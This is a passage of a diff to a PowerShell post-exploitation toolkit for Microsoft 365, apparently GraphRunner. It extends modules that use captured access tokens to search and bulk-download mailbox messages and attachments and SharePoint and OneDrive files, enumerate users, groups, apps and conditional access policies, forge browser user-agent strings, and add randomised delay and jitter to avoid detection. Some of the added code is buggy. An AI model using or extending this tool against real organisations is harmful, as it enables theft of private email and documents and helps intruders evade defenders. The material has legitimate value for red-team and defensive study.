+        $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
+        $hitsContainer = $response.value[0].hitsContainers[0]
+        $hits = @($hitsContainer.hits)
+
+        if ($null -eq $graphReportedTotal) {
+            $graphReportedTotal = $hitsContainer.total
+        }
+
+        if ($graphReportedTotal -eq 0 -or $hits.Count -eq 0) {
+            if (!$GraphRun) {
+                Write-Host -ForegroundColor Yellow "[*] No messages were returned for the search term $searchTerm."
+            }
+            return
+        }
+
+        $resultsList = @()
+        $hydratedResults = @()
+        foreach ($hit in $hits) {
+            $hydratedRecord = Get-HydratedMailboxSearchRecord -Hit $hit -RequestHeaders $headers
+            if ($hydratedRecord) {
+                $hydratedResults += $hydratedRecord
+                $LogInfo = @{
+                    "Detector Name" = $DetectorName
+                    "Subject" = $hydratedRecord.Subject
+                    "Sender" = $hydratedRecord.Sender
+                    "Sender Raw" = $hydratedRecord.SenderRaw
+                    "Receivers" = ($hydratedRecord.Receivers -join ', ')
+                    "Date" = $hydratedRecord.Date
+                    "Preview" = $hydratedRecord.Preview
+                }
+
+                $resultsList += New-Object PSObject -Property $LogInfo
+            }
+        }
+
+        $hydratedCount = $resultsList.Count
+        if(!$GraphRun){
+            Write-Host -ForegroundColor yellow "[*] Graph reported $graphReportedTotal potential match(es) for search term $searchTerm. Page $pageNumber returned $($hits.Count) hit(s), $hydratedCount of which were successfully hydrated."
+        }
+        else{
+            if([int]$graphReportedTotal -gt 0){
+                Write-Host -ForegroundColor yellow "[*] Graph reported $graphReportedTotal potential match(es) for detector: $DetectorName. Page $pageNumber returned $($hits.Count) hit(s), $hydratedCount of which were successfully hydrated."
+            }
+        }
+
+        foreach ($result in $resultsList) {
+            if(!$GraphRun){
+                Write-Output "Subject: $($result.Subject) | Sender: $($result.Sender) | Receivers: $($result.Receivers) | Date: $($result.Date) | Message Preview: $($result.Preview)"
+                Write-Host ("=" * 80)
+            }
+        }
+
+        if($OutFile -and $resultsList.Count -gt 0){
+            if(!$GraphRun){
+                Write-Host -ForegroundColor yellow "[*] Writing results to $OutFile"
+            }
+
+            if ($csvHeadersWritten) {
                 $resultsList | Export-Csv -Path $OutFile -NoTypeInformation -Append
             }
+            else {
+                $resultsList | Export-Csv -Path $OutFile -NoTypeInformation
+                $csvHeadersWritten = $true
+            }
+        }
 
-            if(!$GraphRun){
+        if(!$GraphRun){
             while($download -notlike "Yes"){
                 Write-Host -ForegroundColor Cyan "[*] Do you want to download these emails and their attachments? (Yes/No)"
-                $answer = Read-Host 
+                $answer = Read-Host
                 $answer = $answer.ToLower()
                 if ($answer -eq "yes" -or $answer -eq "y") {
                     Write-Host -ForegroundColor yellow "[*] Downloading messages..."
@@ -6038,11 +6785,11 @@ Function Invoke-SearchMailbox{
                         Write-Output "[*] Quitting..."
                     }
                     else{
-                        if($moreresults -like "False"){
-                            Write-Host -ForegroundColor Yellow "[*] No more results. Quitting..."
+                        if($hitsContainer.moreResultsAvailable){
+                            Write-Host -ForegroundColor yellow "[*] Trying to get next page..."
                         }
                         else{
-                            Write-Host -ForegroundColor yellow "[*] Trying to get next page..."
+                            Write-Host -ForegroundColor Yellow "[*] No more results. Quitting..."
                         }
                     }
                     break
@@ -6050,49 +6797,76 @@ Function Invoke-SearchMailbox{
                     Write-Output "Invalid input. Please enter Yes or No."
                 }
             }
+        }
 
-            if ($download -like "Yes"){
-                $emailFileNames = @()
-                $folderName = "mailsearch-" + (Get-Date -Format 'yyyyMMddHHmmss')
-                New-Item -Path $folderName -ItemType Directory | Out-Null
-                # Process the response and export email content
-                foreach ($hit in $response.value[0].hitsContainers[0].hits) {
-                $webLink = $hit.resource.webLink
-                $itemId = [regex]::Match($webLink, "ItemID=([^&]+)").Groups[1].Value
-                $subject = $hit.resource.subject
+        if ($download -like "Yes" -and $hydratedResults.Count -gt 0){
+            $emailFileNames = @()
+            if (-not $downloadFolderName) {
+                $downloadFolderName = "mailsearch-" + (Get-Date -Format 'yyyyMMddHHmmss')
+                New-Item -Path $downloadFolderName -ItemType Directory | Out-Null
+            }
 
-                # Remove special characters and replace spaces with underscores
+            foreach ($result in $hydratedResults) {
+                $messageDetails = $result.Message
+                $subject = $result.Subject
                 $cleanedSubject = $subject -replace '[^\w\s]', '' -replace '\s', '_'
-        
+                if ([string]::IsNullOrWhiteSpace($cleanedSubject)) {
+                    $cleanedSubject = "message"
+                }
 
-                # Fetch email details using the message ID
                 Write-Host "[*] Downloading $cleanedSubject"
-                $messageDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$itemId" -Headers $headers -Method Get
                 $dateTimeString = $messageDetails.sentDateTime
-                $dateTime = [DateTime]::ParseExact($dateTimeString, "yyyy-MM-ddTHH:mm:ssZ", [System.Globalization.CultureInfo]::InvariantCulture)
+                $dateTime = $null
+                if (-not [string]::IsNullOrWhiteSpace($dateTimeString)) {
+                    $dateTime = [DateTime]::Parse($dateTimeString, [System.Globalization.CultureInfo]::InvariantCulture)
+                }
+                elseif (-not [string]::IsNullOrWhiteSpace($messageDetails.receivedDateTime)) {
+                    $dateTime = [DateTime]::Parse($messageDetails.receivedDateTime, [System.Globalization.CultureInfo]::InvariantCulture)
+                }
+                else {
+                    $dateTime = Get-Date
+                }
+
                 $numericDate = $dateTime.ToString("yyyyMMddHHmmss")
-                $filename = ($cleanedSubject + "-" + $numericDate +".json")
+                $filename = ($cleanedSubject + "-" + $numericDate + ".json")
                 $emailFileNames += $filename
-                # Save email details as a .msg file
-                $messageDetails | ConvertTo-Json | Out-File -FilePath "$folderName\$filename" -Encoding UTF8
+                $messageDetails | ConvertTo-Json -Depth 10 | Out-File -FilePath "$downloadFolderName\$filename" -Encoding UTF8
 
-                # Fetch and save attachments
                 if ($messageDetails.hasAttachments -like "True") {
-                        Write-Host ("[**] " + $messageDetails.subject + " has attachments.")
-                        $attachmentDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages/$itemId/attachments" -Headers $headers -Method Get
+                    Write-Host ("[**] " + $messageDetails.subject + " has attachments.")
+                    $odataSafeItemId = $result.ItemId.Replace("'","''")
+                    $attachmentDetails = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages('$odataSafeItemId')/attachments" -Headers $headers -Method Get
 
-                        foreach($item in $attachmentDetails.value){
+                    foreach($item in $attachmentDetails.value){
                         $attachmentContentBytes = [System.Convert]::FromBase64String($item.contentBytes)
-                        $attachmentFileName = ($CleanedSubject + "-attached-" + $item.name)
+                        $attachmentFileName = ($cleanedSubject + "-attached-" + $item.name)
                         Write-Host "[***] Downloading attachment $attachmentFileName"
-                        $attachmentContentBytes | Set-Content -Path "$folderName\$attachmentFileName" -Encoding Byte
-                        }
-        
+                        $attachmentContentBytes | Set-Content -Path "$downloadFolderName\$attachmentFileName" -Encoding Byte
+                    }
                 }
+            }
+
+            $emailFileNames | ConvertTo-Json | Out-File -FilePath "$downloadFolderName\filelist.json" -Encoding UTF8
+            $downloadedAnyMessages = $true
+        }
+
+        if (-not $PageResults) {
+            $moreresults = $false
+        }
+        else {
+            $moreresults = [bool]$hitsContainer.moreResultsAvailable
+            if ($moreresults) {
+                $searchOffset += $MessageCount
+                $pageNumber += 1
+                if (!$GraphRun -and $download -like "Yes") {
+                    $download = $null
                 }
-                # Export the email file names to filelist.json
-                $emailFileNames | ConvertTo-Json | Out-File -FilePath "$folderName\filelist.json" -Encoding UTF8
-                $htmlContent = @"
+            }
+        }
+    }
+
+    if ($downloadedAnyMessages -and $downloadFolderName) {
+        $htmlContent = @"
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -6190,23 +6964,11 @@ Function Invoke-SearchMailbox{
 </body>
 </html>
 "@
-        
-            $htmlContent | Out-File -FilePath "$folderName\emailviewer.html" -Encoding UTF8
-            Write-Host -ForegroundColor yellow "[*] Emails and attachments have been exported to the folder $folderName."
-            Write-Host -ForegroundColor yellow "[*] A simple emailviewer.html has been provided to view the exported emails."
-            Write-Host -ForegroundColor yellow "[*] To use it run the Invoke-HTTPServer module in the $folderName directory and then navigate to http://localhost:8000/emailviewer.html"
-        }
-        }
-        
-        
-        If(!$PageResults){
-            $moreresults = "False"
-        }
-        if ($PageResults -and ($moreresults -like "True")) {
-            $searchQuery.requests[0].from += $MessageCount
-            $searchQueryJson = $searchQuery | ConvertTo-Json -Depth 10
-            $response = Invoke-RestMethod -Uri $graphApiUrl -Headers $headers -Method Post -Body $searchQueryJson
-        }
+
+        $htmlContent | Out-File -FilePath "$downloadFolderName\emailviewer.html" -Encoding UTF8
+        Write-Host -ForegroundColor yellow "[*] Emails and attachments have been exported to the folder $downloadFolderName."
+        Write-Host -ForegroundColor yellow "[*] A simple emailviewer.html has been provided to view the exported emails."
+        Write-Host -ForegroundColor yellow "[*] To use it run the Invoke-HTTPServer module in the $downloadFolderName directory and then navigate to http://localhost:8000/emailviewer.html"
     }
         
 }
@@ -6268,7 +7030,13 @@ function Get-SharePointSiteURLs{
     Param(
         [Parameter(Position = 0, Mandatory = $False)]
         [object[]]
-        $Tokens = ""
+        $Tokens = "",
+        [Parameter(Position = 1, Mandatory = $False)]
+        [int]
+        $BatchSize = 200,
+        [Parameter(Position = 2, Mandatory = $False)]
+        [int]
+        $MaxSites = 0
     )
 
     if($Tokens){
@@ -6294,24 +7062,31 @@ function Get-SharePointSiteURLs{
                 }
             }
     }
-    $accesstoken = $tokens.access_token   
+    $accessToken = $tokens.access_token
     [string]$refreshToken = $tokens.refresh_token 
 
-
-    # Define the base URL and search URL
     $baseUrl = "https://graph.microsoft.com/v1.0"
     $searchUrl = "$baseUrl/search/query"
-
-    # Define the initial query
     $query = "*"
     $sharepointDrives = @()
-    $seenDriveIds = @()
+    $seenSiteIds = @{}
+    $from = 0
+    $moreResultsAvailable = $true
+    $batchNumber = 1
 
+    if ($BatchSize -gt 1000) {
+        Write-Host -ForegroundColor yellow "[*] BatchSize exceeds the API max of 1000. Setting it to 1000."
+        $BatchSize = 1000
+    }
 
-        # Construct the request URL with query parameters
-        $url = "$searchUrl"
+    $headers = @{
+        "Authorization" = "Bearer $accessToken"
+    }
 
-        # Define the query request body
+    Write-Host -ForegroundColor yellow "[*] Now getting SharePoint site URLs..."
+    $lastStatusLength = 0
+
+    while ($moreResultsAvailable) {
         $requestBody = @{
             requests = @(
                 @{
@@ -6319,45 +7094,61 @@ function Get-SharePointSiteURLs{
                     query = @{
                         queryString = $query
                     }
-                    from = "0"
-                    size = "500"
+                    from = "$from"
+                    size = "$BatchSize"
                     fields = @("parentReference", "webUrl")
                 }
             )
         }
 
-        # Make a request to the Search API
-        $headers = @{
-            "Authorization" = "Bearer $accessToken"
+        $response = Invoke-RestMethod -Uri $searchUrl -Headers $headers -Method Post -ContentType "application/json" -Body ($requestBody | ConvertTo-Json -Depth 10)
+        $hitsContainer = $response.value[0].hitsContainers[0]
+
+        if ($null -eq $hitsContainer) {
+            break
         }
-        Write-Host -ForegroundColor yellow "[*] Now getting SharePoint site URLs..."
-        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Post -ContentType "application/json" -Body ($requestBody | ConvertTo-Json -Depth 10)
 
-        # Extract drive IDs and web URLs from the results
-        $newDrives = $response.value
-
-        foreach($hit in $newDrives.hitsContainers){
+        foreach($hit in @($hitsContainer.hits)){
             $siteId = $hit.resource.parentReference.siteId
-            $webUrl = $hit.resource.webUrl
-        
-            # Filter out duplicates based on drive ID
-            if ($siteId -notin $seenDriveIds){
+            if ($siteId -and (-not $seenSiteIds.ContainsKey($siteId))) {
                 $sharepointDrives += $hit
+                $seenSiteIds[$siteId] = $true
+
+                if ($MaxSites -gt 0 -and $sharepointDrives.Count -ge $MaxSites) {
+                    break
+                }
             }
-            else{
-                $seenDriveIds += $hit
-            }
-        
         }
 
-    $sorted = $sharepointDrives.hits | Sort-Object {$_.resource.webUrl}
+        $statusMsg = "[*] Batch ${batchNumber}: Fetched $($sharepointDrives.Count) unique URLs so far..."
+        $padLength = [Math]::Max(0, $lastStatusLength - $statusMsg.Length)
+        $padding = " " * $padLength
+        Write-Host -NoNewline -ForegroundColor cyan ("`r$statusMsg$padding")
+        [System.Console]::Out.Flush()
+        $lastStatusLength = $statusMsg.Length
 
-    # Display the list of unique drive IDs and web URLs
+        if ($MaxSites -gt 0 -and $sharepointDrives.Count -ge $MaxSites) {
+            $moreResultsAvailable = $false
+        }
+        else {
+            $moreResultsAvailable = [bool]$hitsContainer.moreResultsAvailable
+            $from += $BatchSize
+            $batchNumber += 1
+        }
+    }
+
+    Write-Host ""
+
+    $sorted = $sharepointDrives | Sort-Object { $_.resource.webUrl }
+
     if ($sorted.count -gt 0){
         Write-Host -ForegroundColor yellow ("[*] Found a total of " + $sorted.count + " site URLs.")
         foreach ($drive in $sorted) {
             Write-Output "Web URL: $($drive.resource.webUrl)"
         }
+    }
+    else {
+        Write-Host -ForegroundColor red "[!] No SharePoint site URLs found."
     }
 
 }
@@ -6423,9 +7214,30 @@ function Invoke-SearchSharePointAndOneDrive{
     [switch]
     $PageResults,
     [switch]
-    $GraphRun
+    $GraphRun,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device = 'Windows',
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser = 'Edge'
     )
-
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     if($Tokens){
         #Suppressing output if GraphRun module is used
         if (!$GraphRun){
@@ -6461,6 +7273,7 @@ function Invoke-SearchSharePointAndOneDrive{
     $headers = @{
     "Authorization" = "Bearer $access_token"
     "Content-Type" = "application/json"
+    "User-Agent" = $UserAgent
     }
 
     # Define the search query
@@ -6566,27 +7379,32 @@ function Invoke-SearchSharePointAndOneDrive{
 
         while ($done -ne $true) {
             if ($done -eq "yes") {
-                Write-Host -ForegroundColor Cyan "[*] Do you want to download any more files? (Yes/No)"
+                Write-Host -ForegroundColor Cyan "[*] Do you want to download any more files? (Yes/No/All)"
                 $anotherDownload = Read-Host
                 $anotherDownload = $anotherDownload.ToLower()
-
                 if ($anotherDownload -eq "yes" -or $anotherDownload -eq "y") {
                     Write-Host -ForegroundColor Cyan '[*] Enter the result number(s) of the file(s) that you want to download. Ex. "0,10,24"'
                     $resulttodownload = Read-Host
                     $resultstodl = $resulttodownload.split(",")
                     foreach ($res in $resultstodl){
                         $specificfileinfo = $resultarray[$res]
-                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
+                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename -Device $Device -Browser $Browser
                     }
                 } elseif ($anotherDownload -eq "no" -or $anotherDownload -eq "n") {
                     Write-Output "[*] Quitting..."
                     $done = $true
                     break
+                } elseif ($answer -eq "all") {
+                    Write-Host -ForegroundColor Cyan '[***] WARNING - Downloading ALL' + $itemnumber 'matches.'
+                        for ($res=0; $res -lt $itemnumber; $res++){
+                            $specificfileinfo = $resultarray[$res]
+                            Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename -Device $Device -Browser $Browser
+                        }
                 } else {
                     Write-Output "Invalid input. Please enter Yes or No."
                 }
             } else {
-                Write-Host -ForegroundColor Cyan "[*] Do you want to download any of these files? (Yes/No)"
+                Write-Host -ForegroundColor Cyan "[*] Do you want to download any of these files? (Yes/No/All)"
                 $answer = Read-Host
                 $answer = $answer.ToLower()
 
@@ -6597,12 +7415,20 @@ function Invoke-SearchSharePointAndOneDrive{
                     $resultstodl = $resulttodownload.split(",")
                     foreach ($res in $resultstodl){
                         $specificfileinfo = $resultarray[$res]
-                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename
+                        Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename -Device $Device -Browser $Browser
                     }
                 } elseif ($answer -eq "no" -or $answer -eq "n") {
                     Write-Output "[*] Quitting..."
                     $done = $true
                     break
+
+                } elseif ($answer -eq "all") {
+                    $done = "yes"
+                    Write-Host -ForegroundColor Cyan '[***] WARNING - Downloading ALL' + $itemnumber 'matches.'
+                        for ($res=0; $res -lt $itemnumber; $res++){
+                            $specificfileinfo = $resultarray[$res]
+                            Invoke-DriveFileDownload -Tokens $tokens -DriveItemIDs $specificfileinfo.driveitemids -FileName $specificfileinfo.filename -Device $Device -Browser $Browser
+                        }
                 } else {
                     Write-Output "Invalid input. Please enter Yes or No."
                 }
@@ -6653,13 +7479,36 @@ function Invoke-DriveFileDownload{
     $DriveItemIDs = "",
     [Parameter(Position = 2, Mandatory = $true)]
     [string]
-    $FileName = ""
+    $FileName = "",
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device,
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser
     )
+    if ($Device) {
+		if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device -Browser $Browser
+		}
+		else {
+			$UserAgent = Invoke-ForgeUserAgent -Device $Device
+		}
+	}
+	else {
+	   if ($Browser) {
+			$UserAgent = Invoke-ForgeUserAgent -Browser $Browser 
+	   } 
+	   else {
+			$UserAgent = Invoke-ForgeUserAgent
+	   }
+	}
     $access_token = $tokens.access_token
     $itemarray = $driveitemids.split(":")
     $downloadUrl = ("https://graph.microsoft.com/v1.0/drives/" + $itemarray[0] + "/items/" + $itemarray[1] + "/content")
     $downloadheaders = @{
     "Authorization" = "Bearer $access_token"
+    "User-Agent" = $UserAgent
     }
     Write-Host -ForegroundColor yellow "[*] Now downloading $FileName"
     Invoke-RestMethod -Uri $downloadUrl -Headers $downloadheaders -OutFile $filename
@@ -7060,18 +7909,70 @@ function Invoke-GraphRunner{
 
         A json file containing KQL queries. See the default_detectors.json file in the repo as an example.
 
+    .PARAMETER Resource
+        Specifies the Microsoft Graph resource URL. Default is "https://graph.microsoft.com/".
+
+    .PARAMETER Device
+        Indicates the device type for user agent string. Options are: Mac, Windows, AndroidMobile, iPhone. Default is Windows.
+
+    .PARAMETER Browser
+        Specifies the browser type for user agent string. Options include: Android, IE, Chrome, Firefox, Edge, Safari. Default is Edge.
+
+    .PARAMETER ClientID
+        The Client ID for authentication. Default is set to "d3590ed6-52b3-4102-aeff-aad2292ab01c".
+
+    .PARAMETER DisableRecon
+        If set, disables Graph Reconnaissance.
+
+    .PARAMETER DisableUsers
+        If set, disables Azure AD user enumeration.
+
+    .PARAMETER DisableGroups
+        If set, disables security group enumeration.
+
+    .PARAMETER DisableCAPS
+        If set, disables CAPS data dumping.
+
+    .PARAMETER DisableApps
+        If set, disables application enumeration.
+
+    .PARAMETER DisableEmail
+        If set, disables email search.
+
+    .PARAMETER DisableSharePoint
+        If set, disables SharePoint and OneDrive search.
+
+    .PARAMETER DisableTeams
+        If set, disables Teams search.
+
+    .PARAMETER Delay
+        Adds a delay between operations in milliseconds. Valid range is 0-10000.
+        Code from PowerShell Empire :)
+
+    .PARAMETER Jitter
+        Adds variability to the delay. Must be between 0.0 and 1.0.
+        Code from PowerShell Empire :)
+
     .EXAMPLE
-        
         C:\PS> Invoke-GraphRunner -Tokens $tokens
         -----------
         Runs through the account with many of the enumeration and pillage modules using the default_detectors.json file.
-    #>
-
+#>
     param(
     [Parameter(Position = 0, Mandatory = $false)]
     [object[]]
     $Tokens = "",
-    [Parameter(Position = 1, Mandatory = $false)]
+    [Parameter(Mandatory=$false)]
+    [string]$Resource = "https://graph.microsoft.com/",
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
+    [String]$Device = "Windows",
+    [Parameter(Mandatory=$False)]
+    [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
+    [String]$Browser = "Edge",
+    [Parameter(Mandatory=$False)]
+    [String]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+    [Parameter(Mandatory = $false)]
     [string]
     $DetectorFile = ".\default_detectors.json",
     [switch]
@@ -7089,9 +7990,14 @@ function Invoke-GraphRunner{
     [switch]
     $DisableSharePoint,
     [switch]
-    $DisableTeams
+    $DisableTeams,
+    [ValidateRange(0,10000)]
+    [Int]
+    $Delay = 0,
+    [ValidateRange(0.0, 1.0)]
+    [Double]
+    $Jitter = .3
     )
-    
     if($Tokens){
         Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
     }
@@ -7127,33 +8033,138 @@ function Invoke-GraphRunner{
     # GraphRecon
     if(!$DisableRecon){
         Write-Host -ForegroundColor yellow "[*] Now running Invoke-GraphRecon."
-        Invoke-GraphRecon -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
+        Invoke-GraphRecon -Tokens $tokens -ClientID $ClientID -Device $Device -Browser $Browser -GraphRun | Out-File -Encoding ascii "$folderName\recon.txt"
+    }
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
     }
 
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # Users
     if(!$DisableUsers){
         Write-Host -ForegroundColor yellow "[*] Now getting all users"
-        Get-AzureADUsers -Tokens $tokens -GraphRun -outfile "$folderName\users.txt"
+        Get-AzureADUsers -Tokens $tokens -ClientID $ClientID -Device $Device -Browser $Browser -GraphRun -outfile "$folderName\users.txt"
+    }
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
     }
 
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # Groups
     if(!$DisableGroups){
         Write-Host -ForegroundColor yellow "[*] Now getting all groups"
-        Get-SecurityGroups -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
+        Get-SecurityGroups -Tokens $tokens -ClientID $ClientID -Device $Device -Browser $Browser -GraphRun | Out-File -Encoding ascii "$folderName\groups.txt"
+    }
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
     }
 
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # CAPS
     if(!$DisableCAPS){
         Write-Host -ForegroundColor yellow "[*] Now getting conditional access policies"
         Invoke-DumpCAPS -Tokens $tokens -ResolveGuids -GraphRun | Out-File -Encoding ascii "$folderName\caps.txt"
     }
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
 
-    # Apps
-    if(!$DisableApps){
-        Write-Host -ForegroundColor yellow "[*] Now getting applications"
-        Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
     }
 
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
+    # Apps
+    if(!$DisableApps){
+    Write-Host -ForegroundColor yellow "[*] Now getting applications"
+    Invoke-DumpApps -Tokens $tokens -GraphRun | Out-File -Encoding ascii "$foldername\apps.txt"
+}
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
+    }
+
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # Email
     if(!$DisableEmail){
         $mailout = "$folderName\interesting-mail.csv"
@@ -7163,7 +8174,28 @@ function Invoke-GraphRunner{
             Invoke-SearchMailbox -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -MessageCount 500 -OutFile $mailout -GraphRun -PageResults
         }
     }
-    
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
+    }
+
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # SharePoint and OneDrive Tests
     if(!$DisableSharePoint){
         $spout = "$folderName\interesting-files.csv"
@@ -7173,7 +8205,28 @@ function Invoke-GraphRunner{
             Invoke-SearchSharePointAndOneDrive  -Tokens $tokens -SearchTerm $detect.SearchQuery -DetectorName $detect.DetectorName -PageResults -ResultCount 500 -ReportOnly -OutFile $spout -GraphRun
         }
     }
-    
+    # Calculate the minimum sleep time
+    $minDelay = $Delay * (1 - $Jitter)
+    if ($minDelay -lt 0) { $minDelay = 0 }
+
+    # Calculate the maximum sleep time
+    $maxDelay = $Delay * (1 + $Jitter)
+
+    # If maxDelay is less than or equal to minDelay, we need to ensure some jitter
+    if ($maxDelay -le $minDelay) {
+        $maxDelay = $minDelay + 1
+    }
+
+    # Use integer values for sleep time in seconds
+    $minDelay = [Math]::Floor($minDelay)
+    $maxDelay = [Math]::Ceiling($maxDelay)
+
+    # Generate a random number within this range
+    $RandNo = New-Object System.Random
+    $SleepyTime = $RandNo.Next($minDelay, $maxDelay + 1)
+
+    Write-Output "Sleeping for $SleepyTime seconds."
+    Start-Sleep -Seconds $SleepyTime
     # Teams
     if(!$DisableTeams){
         $teamsout = "$folderName\interesting-teamsmessages.csv"
@@ -7453,82 +8506,84 @@ function Invoke-ImportTokens {
         [pscustomobject]@{access_token=$AccessToken;refresh_token=$RefreshToken}
     )
 }
-function List-GraphRunnerModules{
+function List-GraphRunnerModules {
     <#
     .SYNOPSIS 
     A module to list all of the GraphRunner modules
     #>
 
-    Write-Host -foregroundcolor green "[*] Listing GraphRunner modules..."
+    Write-Host -ForegroundColor Green "[*] Listing GraphRunner modules..."
 
-    Write-Host -ForegroundColor green "-------------------- Authentication Modules -------------------"
-    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
-    Write-Host -ForegroundColor green "Get-GraphTokens`t`t`t-`t Authenticate as a user to Microsoft Graph
-Invoke-RefreshGraphTokens`t-`t Use a refresh token to obtain new access tokens
-Get-AzureAppTokens`t`t-`t Complete OAuth flow as an app to obtain access tokens
-Invoke-RefreshAzureAppTokens`t-`t Use a refresh token and app credentials to refresh a token
